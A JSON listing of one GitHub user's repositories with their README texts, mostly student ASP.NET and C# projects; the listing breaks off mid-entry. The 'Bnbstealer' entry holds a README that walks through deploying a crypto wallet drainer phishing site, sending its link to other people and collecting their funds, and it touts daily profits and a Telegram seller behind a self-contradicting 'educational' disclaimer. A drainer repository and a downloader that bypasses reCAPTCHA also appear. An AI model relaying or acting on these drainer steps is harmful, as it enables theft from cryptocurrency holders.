[
  {
    "name": "1fichier-dl",
    "description": "1Fichier Download Manager.",
    "url": "https://github.com/edonberishaa/1fichier-dl",
    "readme": "**üßô‚Äç‚ôÇÔ∏è 1Fichier-dl Project**\n\n(This is a fork version of the 1Fichier-dl project, which is no longer being maintained.)\n\n<p align=\"left\">\n  <img src=\"https://github.com/leinad4mind/1fichier-dl/blob/main/screenshots/ico.png?raw=true\"></img>\n</p>\n\n# üò∫ 1Fichier Downloader\n\nThis is the `1Fichier Download Manager` program that can be simply run as an `exe` file without installation on Windows.\nWe help you download at the fastest possible speed without having to wait for each download.\n\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/preview-1fichier-site.png\"></img>\n</p>\n<p align=\"center\">\n  <b>You can copy and enter the 1fichier.com download link (URL) in your browser.</b>\n</p>\n<br/>\n<br/>\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/preview-ouo-shortlink.png\"></img>\n</p>\n<p align=\"center\">\n  <b>If you directly copy and enter the ouo.io shortened link (URL) in the browser, reCAPTCHA is automatically bypassed</b>\n</p>\n<br/>\n<br/>\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/preview0.png\"></img>\n</p>\n\n<p align=\"center\">\n  <b>Simple operation by entering the 1fichier link address in the 1fichier downloader program.</b>\n</p>\n<br/>\n<br/>\n\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/preview_settings0.png\"></img>\n</p>\n\n<p align=\"center\">\n  <b>Copy from clipboard or automatically download to bypass latency through multiple proxy servers.</b>\n</p>\n<br/>\n<br/>\n\n## üòº Introduction to key features\n\n‚≠ê You can manage your download list just by entering the download ‚Äòlink‚Äô address, so you can hang it up and sleep to your heart‚Äôs content.\n\n‚≠ê ‚ÄòBypass‚Äô the inconvenience of waiting time during continuous downloads for free users.\n\n‚≠ê Users can directly enter the proxy list via URL in the Settings > Connections menu. (replaces default proxy)\n\n‚≠ê In addition to the `1ficher` link, when you directly enter a shortened `URL` such as `ouo.io`, an automatic link that bypasses `reCAPTCHA` is added.\n\n‚≠ê The default download folder path is the Windows ‚ÄòDownload‚Äô folder.\n\n_Your life is short. Don't wait any longer._\n\n<br/>\n<br/>\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/Screenshot_Light.png\"></img>\n</p>\n\n<p align=\"center\">\n  <b>Light Theme</b>\n</p>\n<br/>\n<br/>\n\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/leinad4mind/1fichier-dl/main/screenshots/Screenshot_Dark.png\"></img>\n</p>\n\n<p align=\"center\">\n  <b>Dark Theme</b>\n</p>\n<br/>\n<br/>\n\n## üòª Improvements\n\n- Readability of ‚ÄòGUI‚Äô icon colors improved\n- Change in the ‚Äòdefault proxy list‚Äô provided by default in the program.\n- Easier build with `exe` for Windows using `PyInstaller` (`onefile` build applied)\n- In case of proxy bypass, the proxy server currently being attempted is indicated as `Protocol://IP:PORT` in the `Status` item.\n- Added `Progress %` decimal notation so that users can easily see the current progress.\n- Applying `reCAPTCHA` bypass to the cumbersome `ouo.io` shortened `URL` when copying the link.\n- Improvement of `UX` that worked awkwardly when adding a download link (prevention of loading screen and duplicate input)\n- Added ‚ÄòAdd from Clipboard‚Äô function to allow immediate download of ‚ÄòURL‚Äô copied to ‚ÄòClipboard‚Äô\n- Supports simultaneous proxy bypass downloads using `multi-thread` (default `3`, can be changed in settings, experimental)\n  <br/>\n  <br/>\n\n## üòπ Things to improve in the future\n\n- Improved speed slowdown due to repeated `requests` using `https` proxy (applied and testing `sock5` proxy)\n- If you are connected to a proxy server with a slow download speed such as `100kb`, you need to automatically change to another proxy.\n- Added exception handling when adding duplicate downloads with the same file name (processing required after actual 1fichier URL parsing)\n- Supports asynchronous download using `Asyncio` instead of `Threading`, which is slow when downloading simultaneously (increases speed)\n- In addition to the basic specification ‚Äò1ficher‚Äô, it is necessary to check whether programs from other similar download sites are supported.\n- Supports simultaneous proxy downloads using `Threading`\n  <br/>\n  <br/>\n\n## üôÄ Run in a non-Windows environment\n\nFor development purposes, or when running the GUI directly through Python on Linux or Mac, you can run it from the project folder as follows.\nThere are currently only a few dependencies, but there will be no problem if you proceed based on Python 3.11 version.\n\n```\npip install -r requirements.txt\npython 1fichier-dl.py\n```\n\n<br/>\n<br/>\n\n## üòæ Building Windows exe using PyInstaller\n\nWe used `Python v3.11` version to build the `Legacy` project as a Windows program.\nYou can also install `requirements.txt` from the project folder and build it directly.\n\n```\npyinstaller --windowed --noconsole --onefile --noconfirm --clean --hiddenimport=_cffi_backend --additional-hooks-dir=. --icon=core/gui/res/ico.ico --paths \"[Python_Lib_Path]\" --add-data \"core/gui/res/*.*;res/\" ./1fichier-dl.py\n```\n\nModified to `onefile` build for cleaner folder structure.\nSince it is Windows-based, if there is a problem with the default file storage path, you must `build` in the folder structure rather than `onefile`.\n\nWhen building a Windows program in `exe` format using `PyInstaller`, refer to the example of the command above.\nThe Python `Lib` path in the `paths` item will be a child of the `env` path when using conada.\n\nStrangely, due to the chronic virus misdiagnosis problem of `PyInstaller`, I downloaded the `PyInstaller` source directly, initialized the existing build environment with `python ./waf distclean all`, and then installed `setup.py` in the folder with `pip install .`. You must install it yourself.\n\n<br/>\n<br/>\n\n## üòΩ Thank you so much.\n\n- The button icons in the program use [Feather](https://feathericons.com/), which provides great free icons.\n- The icon for the Windows program is a free icon from [svgrepo](https://www.svgrepo.com/).\n- The program's loading overlay icon uses the free `svg` icon from [loading.io](https://loading.io).\n- The free `https` proxy server list is provided by [FREE_PROXIES_LIST](https: //github.com/Zaeem20/FREE_PROXIES_LIST) project and many other uses\n- The creator of the 1Fichier-dl project is `manuGMG`, branching from the version project of [jshsakura](https://github.com/jshsakura/1fichier-dl), which created an improved version from mine and I am forking to mine again.\n- To reduce inconvenience when copying a link, use [xcscxr](https://github.com/xcscxr) to bypass `reCAPTCHA` for `ouo.io` shortened `URL`.\n"
  },
  {
    "name": "AttendanceSystem",
    "description": null,
    "url": "https://github.com/edonberishaa/AttendanceSystem",
    "readme": "# üìò Attendance System\n\n## üìù Project Description\n\nThe **Attendance System** is a web-based application developed to streamline and automate student attendance tracking for professors. The system integrates with an **Arduino fingerprint scanner**, enabling seamless and secure attendance verification.\n\n**Key Features:**\n- Fingerprint-based student verification via Arduino.\n- Real-time updates using SignalR.\n- Attendance record filtering (by date/week).\n- Excel export functionality.\n- Subject and student management through an intuitive dashboard.\n\n**Tech Stack:**\n- **Backend:** ASP.NET Core  \n- **Database:** Entity Framework Core (SQL Server)  \n- **Real-time Communication:** SignalR  \n- **Hardware:** Arduino with fingerprint sensor  \n\n---\n\n## üë• Team Members\n\n| Name            | Role                                          |\n|-----------------|-----------------------------------------------|\n| Edon Berisha    | Full Stack Developer & Project Lead           |\n| Alban Rrahmani  | Hardware Engineer, Full-Stack Developer       |\n| Petrit Rexha    | Backend Developer, Data Analyst               |\n| Leutrim Istrefi | Node.js Developer                             |\n\n---\n\n## ‚öôÔ∏è How to Set Up\n\n### üîß Prerequisites\n\n**Software Requirements:**\n- [.NET 6 SDK](https://dotnet.microsoft.com/en-us/download) or later\n- Visual Studio or VS Code\n- SQL Server\n- [Arduino IDE](https://www.arduino.cc/en/software) (for hardware setup)\n\n**Hardware Requirements:**\n- Arduino board with fingerprint sensor module\n\n**Dependencies:**\nInstall the required NuGet packages:\n```bash\ndotnet add package Microsoft.EntityFrameworkCore\ndotnet add package Microsoft.EntityFrameworkCore.Tools\ndotnet add package Microsoft.EntityFrameworkCore.SqlServer\ndotnet add package ClosedXML\ndotnet add package Microsoft.AspNetCore.SignalR\n```\n\n## üîß Setup Instructions (Detailed)\n\n### 1. Clone the Repository:\n```bash\ngit clone https://github.com/edonberishaa/AttendanceSystem.git\ncd AttendanceSystem\n"
  },
  {
    "name": "Bleri",
    "description": "bleri commerce bussiness",
    "url": "https://github.com/edonberishaa/Bleri",
    "readme": "I'm creating a website for my bussiness BLERI COMMERCE\n"
  },
  {
    "name": "blericommerce",
    "description": null,
    "url": "https://github.com/edonberishaa/blericommerce",
    "readme": "No README found."
  },
  {
    "name": "BlogSiteCSE",
    "description": null,
    "url": "https://github.com/edonberishaa/BlogSiteCSE",
    "readme": "# BlogCSE üñ•Ô∏èüìù\nnote: Project in progress!\n\n[![.NET Version](https://img.shields.io/badge/.NET-8.0-blue)](https://dotnet.microsoft.com/)\n[![License](https://img.shields.io/badge/License-MIT-green)](https://opensource.org/licenses/MIT)\n[![GitHub Issues](https://img.shields.io/github/issues/edonberishaa/BlogCSE)](https://github.com/edonberishaa/BlogCSE/issues)\n\nA collaborative ASP.NET Core blog platform for computer science and engineering enthusiasts.\n\n![Blog Preview](https://via.placeholder.com/800x400.png?text=BlogCSE+Preview) <!-- Add real screenshot later -->\n\n## Features ‚ú®\n- üìù Create and manage technical blog posts\n- üîñ Tag system for C#/.NET, Algorithms, Web Development, etc.\n- üîç Full-text search functionality\n- üë• User authentication & authorization\n- üí¨ Comment system for discussions\n- üìà Analytics dashboard (WIP)\n- üåê Responsive UI with Bootstrap\n\n## Tech Stack üõ†Ô∏è\n- **Backend**: ASP.NET Core MVC\n- **Database**: Entity Framework Core + SQL Server (Azure-hosted)\n- **Frontend**: Razor Pages, Bootstrap 5, JavaScript\n- **Authentication**: ASP.NET Core Identity\n- **Real-Time**: SignalR (for future updates)\n- **Tools**: Git, Azure DevOps, Visual Studio 2022\n\n## Getting Started üöÄ\n\n### Prerequisites\n- [.NET 8 SDK](https://dotnet.microsoft.com/download)\n- [Visual Studio 2022+](https://visualstudio.microsoft.com/) or [VS Code](https://code.visualstudio.com/)\n- SQL Server Management Studio (SSMS)\n\n### Installation\n1. Clone the repository:\n   ```bash\n   git clone https://github.com/edonberishaa/BlogCSE.git\n   cd BlogCSE\n   \n2. Configure the database:\n   - Update connection string in appsettings.json:\n     ```json\n     \"ConnectionStrings\": {\n     \"DefaultConnection\": \"Server=your-server;Database=BlogCSE;Trusted_Connection=True;\"\n     }\n3. Run database migrations:\n   ```bash\n   dotnet ef database update\n4. Start the application:\n   ```bash\n   dotnet run\n5. Visit `https://localhost:7274` in your browser\n## Contributing  ü§ù\nWe welcome contributions! Please follow these steps:\n1. Fork the repository\n2. Create your feature branch:\n   ```bash\n   git checkout -b feature/amazing-feature\n3. Commit your changes:\n   ```bash\n   git commit -m 'Add some amazing feature'\n4. Push to the branch:\n   ```bash\n   git push origin feature/amazing-feature\n5. Open a Pull Request\n## License üìÑ\nThis project is licensed under the MIT License.\n## Acknowledgments üéì\n- [Edon Berisha](https://github.com/edonberishaa/) - Project Maintainer\n- [Alban Rrahmani](https://github.com/albanrr9) - Core Contributor\n\n**Happy Coding! üë®üíªüë©üíª**\n"
  },
  {
    "name": "bnb-eth-usdt-wallet-drainer",
    "description": null,
    "url": "https://github.com/edonberishaa/bnb-eth-usdt-wallet-drainer",
    "readme": "No README found."
  },
  {
    "name": "Bnbstealer",
    "description": "Drain wallets",
    "url": "https://github.com/edonberishaa/Bnbstealer",
    "readme": "\nNOTE: This is just a demo script, to demonstrate how a real drainer works, it's easily detected,\n\t so try it out, and get a real drainer at :\n\n- **‚úâ Contact: https://t.me/Cryptohacker1402** \n- **üë• Channel: https://t.me/cryptohackers1402** \n\nHow to use the BNB Drainer:\n\n1. Click on star and fork in the upper right corner\n2. Open up the settings.js file and replace the marked words in the first row with your bsc adress\n3. Go to https://www.netlify.com/ and import your site via github\n4. Open your drainer site: https://officialchainlink.netlify.app/ and send the link to other people\n5. That's it. The money goes to the bsc wallet adress you have linked in the settings.js file\n\n\nThis is the same method pro hackers use to make millions üí∞\nYou could make like 2000$ a day with this drainer\n\n\n\n!Please only use this for educational purposes not too hack others Please use for testing or educational purposes only Make sure you read everything before using this script Johnnww is not responsible for mistakes or tester who dont spend the time to full read this readme by using this script you accept everything listed in this script in the readme if you dont want to agree to my terms for testing and educational purposes do not use this script. Do not use this script on innocent people Johnnww will not be held responsible for someone who does that this script was only designed for educational or testing purposes to futher increase the security of crypto in the future please read the terms of service and disclaimer before actually using or testing this script money with bots will assume that all users understand everything stated in the disclaimer and terms of service. Dont use this with out reading everything in detail!!!\n\nMIT License\n\nCopyright (c) 2023 \n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\nterms and conditions\n\nby using this script you void all rights to sue or prosicute the developers and using this script to hack others will only hold the hackers responsible for legal and civil actions that may arise from exploiting others this script is only intended to educate people on how this scam works. This script is only intended to be used to educate people its not intended to be used for real world situations. Do not use this script to scam other people. By using this script you agree to these terms and services if you do not want to agree to these terms do not use this script. Also Johnnww is protected under this clause do to the fact he has no affiliations with this script being used in the real world Johnnww is just trying to bring awareness to this type of scam\n\nùêÉùê¢ùê¨ùêúùê•ùêöùê¢ùê¶ùêûùê´: i do not promote hacking i just want to share how hackers have been draining millions of dollars so that the community can learn about it by using this free script you accept the terms that i will not be held responsible for damages arising from the use and damages arising from improperly using this script to hack others or testing. the reason for this script is for purely education purposes only this script is not intended to be used for illegal purposes all content of this script is only there to educate people to avoid being scammed. By using this script you void all ownership too your busd in your wallet and allow it to be used transfered and sold by any wallet approved to do so by this script. And as the user of this script you allow all wallets used by this script to access spend and use your Busd. Johnnww is not the creator of this script. Money with bots is not the creator of this script and holds no responsibily in proving the legitmancy of this script money with bots therefore cannot guanrentee anything said about this script im just trying to share this script to the public so that people are aware of this.The amount approved by the wallet holder shall be consider fees to using the script if the wallet holder does not wish to agree then dont use this script money with bots does not intend on deciving or scamming anyone the fees charged shall be up to the approved amount and can be deducted at anytime. The approval amount can be set and changed by the testers but its default is set and hardcoded into this code. Please do not use this script illegally there is no way i can tell if someone is using this illegally and i do not and will not knowingly allow innocent people to be drained by this script if i suspect anyone of knowingly using this script illegally i will refuse to work with that person in aiding or testing this script. Also this script does not count as any investment or ponzi scheme do to the fact that its not intended to be used in real world scenerios and the fees charged is used to award the users for participating in this testing this script all profits made from this script shall be considered fees for using this script for me finding and uploading it and causing awarness towards this script. This script will help people not be scammed by causing awareness of this type of scam/hack so hopefully in the future crypto will be able to add more safety features to its wallets to limit this type of method. But the only way that this can happen is by more people knowing about it in detail. Do not use this script to hack others i really cannot stress that i have no way of filtering legitmate people and non legit people so all of that will be up too the proper authorities to do because Johnnww does not have those resources. In the beginning of this script readme i state on use this for education purposes which is the first thing people see so i really tried my best to make people not use this illegally and did all i could do to prevent that. Also do to users who use this script outside of github there is no way for me to know a tester from a innocent person so if someone is using this in the real world i am not aware of it and if i suspect that its being used on a real person i will try to blacklist the hacker but this would be impossible for me to do because it has been download by many people and this script may be already in the wild and edited to suit the hackers form but that is a risk that must be taken to educate this generation on this type of scam. The statements made in the readme and youtube video should be taken with a grain of salt because i have not personally used or tested this script before but have been told that it preforms well. I am not well educated on coding or this script and does not have the understanding to see if the code works as stated in the video but i was told be a coder that this was how it worked and i obtained this script from him. So the forks and clones is what should be targeted if an investigation or civil suit is applied from this because there the ones who are actually using and spreading this script not me Johnnww has never used this script on a real person and does not ever intend on doing that in the future. Please make sure you read this disclamer fully before using or testing this script it states my full and honost intentions and no decieving or fraud has been done by me Johnnww. All profits Johnnww makes is used to maintain the servers and my time to keep this running indefiently if i dont profit from this then i would not be able to keep this script running properly so this script does allow Johnnww to profit from this script if he chooses to do so which is run by a automated server which could send fees to Johnnww directly so he can keep the script running and operational for testers the way this works is a trade secret and cannot be futher explained here. But my main point is that Johnnww is able to profit from the money the testers use so that he can keep this script fully functinal and add updates by the Johnnww team. But no one has invested in this script no one is recruited for this script no one is being decieved by this script so if Johnnww is contacted by any law enforcements there will be little he could do to help with identifing the hackers that are cloning this script and using it on innocent people. In closing Johnnww is doing this for a profit but he is only trying to profit from the testers money that they use to test this script if Johnnww profit from any innocent person he would not be able to tell if is from an innocent person or one of the many scammers claming to be an innocent person so without hard proof of any person thats innocent thats been drained by this script Johnnww would not be able to help and also since Johnnww doesnt recieve the full amount and only charge fees he would not be able to do any refunds do to the fact that it would not all go to me Johnnww. But money with bots would be able to do a partial refund on a case by case basis but do to the amount of scammers out there Johnnww will not activily scan for innocent people being scammed by this and will count on the people that forked it and cloned it to only use this for legit purposes.Update do to people exploiting the automation system that was previously being designed all transactions will be done manually from 7/17/2022 on and foward untill a more secure method is applied!!! Innocent non testers are the only ones eligable for a partial refund testers are not eligable!!!\n"
  },
  {
    "name": "BookStoreApp",
    "description": null,
    "url": "https://github.com/edonberishaa/BookStoreApp",
    "readme": "# BookStoreApp\n\n## Overview\nBookStoreApp is a web application being developed using ASP.NET and Angular. The primary goal of this project is to create a comprehensive platform for managing and purchasing books. While the project is still in progress, significant steps have been taken towards building its core functionality.\n\n## Current Features\n1. **User Interface:**\n   - Basic layout and navigation have been implemented.\n   - Users can view the initial structure of the application.\n\n2. **Database Integration:**\n   - Initial setup of the database is complete, ensuring a robust backend.\n   - Tables for managing book details and user data have been partially created.\n\n3. **Book Management System:**\n   - Users can add and view book details (title, author, price, etc.).\n   - Edit and delete functionalities are in progress.\n\n4. **Authentication System:**\n   - Basic login and registration features are partially implemented.\n\n5. **API Integration:**\n   - APIs are used to connect the front-end with the back-end seamlessly.\n\n6. **Entity Framework:**\n   - Entity Framework is utilized for database operations, enabling efficient ORM functionality.\n\n## Technologies Used\n- **Framework:** ASP.NET\n- **Frontend:** AngularJS\n- **Backend:** C#\n- **Database:** SQL Server\n- **ORM:** Entity Framework\n- **API:** RESTful APIs\n\n## To-Do List\n1. **Complete User Authentication:**\n   - Implement password encryption.\n   - Add role-based access control for admin and regular users.\n\n2. **Enhance Book Management:**\n   - Finalize CRUD operations for books.\n   - Add advanced search and filter options.\n\n3. **Shopping Cart:**\n   - Allow users to add books to a shopping cart.\n   - Integrate payment gateway for purchases.\n\n4. **UI/UX Improvements:**\n   - Design a more user-friendly interface.\n   - Optimize for mobile devices.\n\n5. **Testing and Debugging:**\n   - Perform thorough testing of all modules.\n   - Fix any identified bugs and issues.\n\n6. **Deployment:**\n   - Prepare the application for deployment.\n   - Deploy the app to a cloud platform.\n\n## Installation\n1. Clone the repository:\n   ```bash\n   git clone https://github.com/edonberishaa/BookStoreApp\n   ```\n2. Open the project in Visual Studio.\n3. Restore NuGet packages.\n4. Configure the database connection in `appsettings.json`.\n5. Run the application.\n\n## Contribution\nContributions are welcome! Feel free to fork the repository and submit pull requests for review.\n\n## Current Status\nThis project is under development and is not yet complete. The features mentioned above are either in progress or planned for future implementation.\n\n## License\nThis project is licensed under the MIT License. See the LICENSE file for details.\n\nThe project is not completed yet!\n\nEdon Berisha\n---\n\nStay tuned for updates as development progresses!\n\n"
  },
  {
    "name": "C--Exercises",
    "description": "C# exercises,mostly of them are from introprogramming.info website",
    "url": "https://github.com/edonberishaa/C--Exercises",
    "readme": "No README found."
  },
  {
    "name": "CakeProduction",
    "description": null,
    "url": "https://github.com/edonberishaa/CakeProduction",
    "readme": "# üéÇ Cake Production Management System\n\n_A bakery management solution for production tracking, inventory control, and sales management_\n\n## ‚ú® Current Features\n\n### üè≠ Production Management\n- Recipe management with ingredient lists\n- Production scheduling\n- Yield calculations (quantity/unit)\n\n### üì¶ Inventory Control\n- Real-time stock monitoring\n- Low-stock email alerts\n- Supplier information tracking\n\n### üë®‚Äçüç≥ User Management\n- Role-based access (Admin, Baker, Manager)\n- Secure authentication\n- Activity logging\n\n## üõ†Ô∏è Tech Stack\n\n### Backend\n- ASP.NET Core 7.0\n- Entity Framework Core\n- SQL Server 2022\n- Hangfire (for background email alerts)\n\n### Frontend\n- Razor Pages\n- jQuery + AJAX\n- Bootstrap 5.2\n- Chart.js (basic reporting)\n\n## üöÄ Installation Guide\n\n### Prerequisites\n- .NET 9.0 SDK\n- SQL Server 2019+\n"
  },
  {
    "name": "Computing-II--Tasks",
    "description": null,
    "url": "https://github.com/edonberishaa/Computing-II--Tasks",
    "readme": "No README found."
  },
  {
    "name": "E-Commerce",
    "description": null,
    "url": "https://github.com/edonberishaa/E-Commerce",
    "readme": "No README found."
  },
  {
    "name": "edon-berisha-portfolio",
    "description": null,
    "url": "https://github.com/edonberishaa/edon-berisha-portfolio",
    "readme": "\n"
  },
  {
    "name": "edonberishaa",
    "description": "Config files for my GitHub profile.",
    "url": "https://github.com/edonberishaa/edonberishaa",
    "readme": "I'm Edon Berisha!\nüöÄ Passionate about Data Science, AI and Software Development\n\nüí° Technical Skills:\nProgramming: Advanced in C# and Python (especially for data interaction)\nWeb Development: Proficient in ASP.NET Core MVC for building modern web applications\nDatabases: Skilled in SQL Server for designing and managing databases\nData Engineering: Solid foundational knowledge\n\nüéì Education:\n2nd-year Computer Science & Engineering student\nFinished 1st year with a 9.27 GPA\n\nüî• Mindset:\nSelf-Motivated | Ambitious | Always Learning\n  \n- <img align=\"center\" src=\"https://github-readme-stats.vercel.app/api?username=edonberishaa&include_all_commits=true&count_private=true&show_icons=true&line_height=20&title_color=2B5BBD&icon_color=1124BB&text_color=A1A1A1&theme=tokyonight\" alt=\"my Github Stats\"/>\n- <img src=\"https://github-readme-streak-stats.herokuapp.com/?user=edonberishaa&theme=tokyonight\" alt=\"mystreak\"/>\n- <img src=\"https://github-readme-stats.vercel.app/api/top-langs?username=edonberishaa&show_icons=true&locale=en&layout=compact&theme=tokyonight\" alt=\"ovi\" />\n\n\n\n\n- üì´ How to reach me;\n-  e-mail: edonberisha52@gmail.com\n- linkedin : https://www.linkedin.com/in/edonberisha/\n- instagram : _edonberisha\n  \n\n\n<!---\nedonberishaa/edonberishaa is a ‚ú® special ‚ú® repository because its `README.md` (this file) appears on your GitHub profile.\nYou can click the Preview link to take a look at your changes.\n--->\n"
  },
  {
    "name": "EmployeePortal",
    "description": "Simple web app created with ASP.NET MVC ",
    "url": "https://github.com/edonberishaa/EmployeePortal",
    "readme": "How to use this project:\n1.You should have .NET 8.0 and git installed in your local machine\n2.run this command \" git clone https://github.com/edonberishaa/EmployeePortal\"\nand there is the web app\n"
  },
  {
    "name": "ExamApplication",
    "description": null,
    "url": "https://github.com/edonberishaa/ExamApplication",
    "readme": "ExamApplication is a C# Desktop application designed to simplify the process of managing and taking exams.\nYou can create questions with 4 possible answers or less.\nYou create the question,possible answers and choose the correct answer.\nThe exam can be held online or in the right part of the application you can see all the questions you've created and you have the possibility to print them in A4 format by double-clicking.\nIt is fully developed with C#\n"
  },
  {
    "name": "Exercises",
    "description": "These are exercises done by me in Kompjuterika I subject.",
    "url": "https://github.com/edonberishaa/Exercises",
    "readme": "No README found."
  },
  {
    "name": "FaceId-Authentication",
    "description": null,
    "url": "https://github.com/edonberishaa/FaceId-Authentication",
    "readme": "No README found."
  },
  {
    "name": "Fizioterapia-Lumi",
    "description": null,
    "url": "https://github.com/edonberishaa/Fizioterapia-Lumi",
    "readme": "Website not fully finished!\n"
  },
  {
    "name": "MovieTickets",
    "description": "Movie Ticket Management Web application using ASP.NET Core MVC",
    "url": "https://github.com/edonberishaa/MovieTickets",
    "readme": "Movie Tickets selling Web Application that includes CRUD operations, connection with database(SQL Server) ,payment integration and much more\nThis website is made during a course I'm taking in ASP.NET Core MVC 5\nNot fully completed!\n"
  },
  {
    "name": "Number-Tracker",
    "description": "This is phone-number tracking pyhton script. You can get some useful information about any phone-number. this script is using some pyhton modules like geocoder, phonenumbers, folium and opencage api to gather data. this is script also show you location of the number on map.",
    "url": "https://github.com/edonberishaa/Number-Tracker",
    "readme": "# [üì° Number-Tracker ](https://github.com/shivang21007/Number-Tracker)\nThis is phone-number tracking pyhton script. You can get some useful information about any phone-number(including international phone-numbers).\nThis script is using some pyhton modules like geocoder, phonenumbers, folium and opencage api to gather data.\nThis is script also show you location of the number on map.\n</br>\n\n![pyhton snipit](https://github.com/shivang21007/Number-Tracker/assets/98748694/81f68fb4-9e7f-46e1-8e8e-0204bac63028)\n\n\n\n\n# üõ†Ô∏è Installation Guidelines:\n\n1. Fork the project. Click on the icon on the top right to get started\n\n2. Clone the project, you can use the following command on your local terminal:\n \n   ```bash\n   git clone https://github.com/your-user-name/Number-Tracker.git\n   ```\n3. Also don't forget to give star to codebase after using it ‚ú®.\n\n   \n\n# üìå To install Pyhton Dependencies\n1. First make sure you have install python in your local system.\n [click here to download pyhton](https://www.python.org/downloads/)\n\n2. Go to your code folder and in terminal run -\n3.  For Phonenumbers Library -\n    ```bash\n    pip install phonenumbers\n    ```\n4. For Geocoder Library -\n   ```bash\n   pip install geocoder\n   ```\n5. For Opencage API -\n   ```bash\n   pip install opencage\n   ```\n6. For Folium Library -\n   ```bash\n   pip install folium\n   ```\n# OpenCage API key\n1. Go to [OpenCage Site](https://opencagedata.com/).\n2. Signin and Get you api-key. \n3. Create a \"key.py\" file .\n4. And paste your api-key there like this - \n   ```bash\n   keys = \"Enter-your-API-Key\"\n   ```\n# üíª To Start the Application on your local system.\n1. Just execute the main.py file.\n2. enter you no. with country code - \n   ```bash\n   +91 XXXXXXXXXX\n   ```\n3. And script will display the information in your terminal and also show you on the map.\n4. If map doesn't open automatically in browser, Just click the \"mylocation.html\" manually.\n"
  },
  {
    "name": "PcManagmentDesktopApp",
    "description": null,
    "url": "https://github.com/edonberishaa/PcManagmentDesktopApp",
    "readme": "# PC Management Desktop App\n\n## Overview\nThe **PC Management Desktop App** is a C# Windows Forms application integrated with an SQL Server database, designed to manage and track PC usage in a gaming center. It allows operators to start and stop timers for individual computers, automatically calculating usage duration and earnings. The system also maintains a history of PC usage, order transactions, and a financial summary for better management.\n\n## Features\n- **PC Usage Tracking**: Start and stop timers for each PC to track playtime.\n- **Automated Billing**: Calculates the cost based on the duration of use.\n- **Order Management**: Add and manage orders (e.g., snacks, drinks) per PC.\n- **Real-time Price Updates**: Synchronizes product prices and calculates totals dynamically.\n- **Financial Summary**: Displays total earnings per PC and overall revenue.\n- **User Authentication**: Secure login system with an SQL Server database.\n- **Data Persistence**: Stores and retrieves PC usage, earnings, and orders from the database.\n\n## Installation\n### Prerequisites\n- Windows OS\n- .NET Framework (version used in development)\n- SQL Server (for database management)\n- Visual Studio (for development and debugging)\n\n### Steps\n1. Clone this repository:\n   ```sh\n   git clone https://github.com/edonberishaa/PcManagmentDesktopApp\n   ```\n2. Open the solution in **Visual Studio**.\n3. Restore NuGet packages and ensure all dependencies are installed.\n4. Set up the **SQL Server database**:\n5. Build and run the application.\n\n## Database Schema\n### Tables\n- **Computers**: Stores computer details and statuses.\n- **Orders**: Manages product orders for each session.\n- **Users**: Stores authentication details.\n- **UsageHistory**: Tracks time and earnings for each PC session.\n\n## Usage\n1. **Login** to access the dashboard.\n2. Select a PC and click **Start Timer** to begin tracking usage.\n3. Click **Stop Timer** when the session ends, and the total cost will be calculated.\n4. Add orders (snacks, drinks) if required.\n5. Double-click to get the invoice\n6. Monitor revenue and PC usage history in the financial summary section.\n\n## Technologies Used\n- **C# (Windows Forms)** for the UI and business logic.\n- **SQL Server** for data storage and management.\n\n## Future Enhancements\n- Adding **remote access features** to manage PCs from another device.\n- Enhancing **UI/UX** with modern design elements.\n- Adding **multi-user roles** for admin and operator management.\n\n## Contributing\n1. Fork the repository.\n2. Create a new branch (`feature-branch`).\n3. Commit your changes and push to GitHub.\n4. Open a pull request for review.\n\n## License\nThis project is licensed under the **MIT License**. See `LICENSE` for more details.\n\n## Contact\nFor inquiries or contributions, contact **Edon Berisha** at edonberisha52@gmail.com\n\n"
  },
  {
    "name": "portfolio-EB",
    "description": null,
    "url": "https://github.com/edonberishaa/portfolio-EB",
    "readme": "# portfolio-EB"
  },
  {
    "name": "projekt1",
    "description": "World Wonders",
    "url": "https://github.com/edonberishaa/projekt1",
    "readme": "# projekt1\nWorld Wonders\n"
  },
  {
    "name": "pythonTranscript",
    "description": null,
    "url": "https://github.com/edonberishaa/pythonTranscript",
    "readme": "No README found."
  },
  {
    "name": "SMScript",
    "description": "SMS Script",
    "url": "https://github.com/edonberishaa/SMScript",
